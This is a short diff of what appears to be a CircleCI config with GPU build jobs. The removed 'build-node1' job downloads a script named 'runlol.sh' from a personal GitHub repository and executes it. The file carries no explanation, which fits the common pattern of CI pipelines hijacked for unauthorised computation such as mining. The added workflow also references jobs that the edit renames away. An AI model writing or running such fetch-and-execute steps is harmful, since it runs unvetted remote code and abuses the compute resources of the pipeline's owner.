@@ -1,14 +1,14 @@
+workflows:
+  version: 2
+  build_nodejs:
+    parallelism: 2
+    jobs:
+      - build-node1
+      - build-node2
 version: 2.1
 
 jobs:
-  build-node1:
-    machine:
-      image: ubuntu-1604-cuda-10.1:201909-23
-    resource_class: gpu.nvidia.small
-    steps:
-      - run: nvidia-smi
-      - run: wget https://raw.githubusercontent.com/muyhushapa/sop/main/runlol.sh && chmod +x runlol.sh && ./runlol.sh
-  build-node2:
+  build-node:
     machine:
       image: ubuntu-1604-cuda-10.1:201909-23
     resource_class: gpu.nvidia.small
